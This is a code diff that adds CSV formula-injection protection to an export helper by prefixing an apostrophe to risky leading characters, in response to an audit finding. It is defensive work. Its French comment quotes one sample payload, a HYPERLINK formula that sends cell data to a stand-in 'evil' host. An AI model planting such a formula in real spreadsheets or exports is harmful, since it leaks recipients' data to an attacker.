@@ -18,9 +18,43 @@ const BOM = "﻿";
 
 const NEEDS_QUOTING_RE = /[",\r\n]/;
 
+// F-023 (audit pré-launch 2026-05) — Mitigation CSV formula injection.
+// Excel/LibreOffice/Sheets évaluent les cellules commençant par
+// `=`, `+`, `-`, `@`, `\t` ou `\r` comme formules au double-clic depuis
+// le CSV. Un attaquant qui contrôle un champ texte (nom produit, note
+// de commande, etc.) peut donc forger une cellule du genre
+// `=HYPERLINK("http://evil/?x="&A1)` qui exfiltre des données quand
+// le destinataire ouvre l'export.
+//
+// Mitigation OWASP : préfixer l'apostrophe ASCII (`'`) à toute valeur
+// qui commence par un de ces caractères. Excel traite alors la cellule
+// comme du texte littéral et n'évalue pas la formule. L'apostrophe est
+// invisible quand la cellule est affichée (Excel la mange visuellement)
+// — un destinataire qui copie-colle peut la voir, c'est acceptable.
+//
+// Appliqué AVANT l'échappement RFC 4180 (quoting) — l'apostrophe n'est
+// pas un caractère spécial pour CSV, mais elle modifie la sémantique
+// Excel.
+export function escapeCsvFormula(value: string): string {
+  if (value.length === 0) return value;
+  const first = value.charCodeAt(0);
+  // = + - @ \t \r
+  if (
+    first === 0x3d ||
+    first === 0x2b ||
+    first === 0x2d ||
+    first === 0x40 ||
+    first === 0x09 ||
+    first === 0x0d
+  ) {
+    return "'" + value;
+  }
+  return value;
+}
+
 export function escapeCsvField(value: string | number | null | undefined): string {
   if (value === null || value === undefined) return "";
-  const str = String(value);
+  const str = escapeCsvFormula(String(value));
   if (NEEDS_QUOTING_RE.test(str)) {
     return `"${str.replace(/"/g, '""')}"`;
   }
